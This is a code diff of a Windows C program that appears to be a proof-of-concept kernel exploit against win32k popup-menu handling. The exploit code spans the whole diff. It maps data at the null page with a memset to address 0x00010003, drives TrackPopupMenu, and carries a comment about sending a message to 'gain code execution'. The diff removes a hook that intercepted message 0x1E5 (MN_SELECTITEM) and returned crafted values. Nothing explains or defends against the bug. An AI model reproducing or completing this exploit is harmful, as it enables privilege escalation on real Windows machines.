@@ -59,18 +59,6 @@ void AllocNullPage()
 	
 }
 
-LRESULTCALLBACK MyWndProc (HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam) 
-{ 
-if (Msg == 0x1E5) // MN_SELECTITEM 
-{ 
-	// control return value 
-	return 0x10; 
-} 
-return DefWindowProc (hWnd, Msg, wParam, lParam); 
-}
-    //===================================================================================
-    //ShowPopupMenu
-    //===================================================================================
  BOOL ShowPopupMenu( HWND hWnd, POINT *curpos, int wDefaultItem ) 
  {
    
@@ -85,45 +73,26 @@ return DefWindowProc (hWnd, Msg, wParam, lParam);
       SetFocus          ( hWnd );
       SendMessage       ( hWnd, WM_INITMENUPOPUP, (WPARAM)hPop, 0 );
    
-      //SHOW POPUP MENU.-----------------------------------------------------------------
-        //GET CURSOR POSITION TO CREATE POPUP THERE.-------------------------------------
+
       POINT pt;
       if (!curpos)
 	 {
         GetCursorPos( &pt );
         curpos = &pt;
      }
-   
-    //if(!SetWindowLong((HWND)hPop, GWL_WNDPROC, (LONG)MyWndProc))
-    //{
-    //	//DebugBreak();
-    //}
-    	//DISPLAT MENU AND WAIT FOR SELECTION.-----------------------------------------
 
     //AllocNullPage();
     memset((void*)0x00010003,'\x41',8);
     WORD cmd = TrackPopupMenu( hPop, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD | TPM_NONOTIFY, curpos->x, curpos->y, 0, hWnd, NULL );
-    	
-		//SEND MESSAGE MAPPED TO SELECTED ITEM.----------------------------------------
-	
-	
+
 // Send message to gain code execution :	SendMessage( hWnd, NULL, NULL, 0 );
-   
- //   DestroyMenu(hPop);
-//return 0;
-	}
-    //===================================================================================
-    //WndProc
-    //===================================================================================
+
+}
+
 static LRESULT CALLBACK WndProc( HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam ) 
 { 
-  if(0x1E5==uMsg)
-	{
-			//DebugBreak();
-	return 10;
-	}
       return DefWindowProc( hWnd, uMsg, wParam, lParam );
-    }
+}
    
  int WINAPI WinMain( HINSTANCE hInst, HINSTANCE prev, LPSTR cmdline, int show ) 
  {
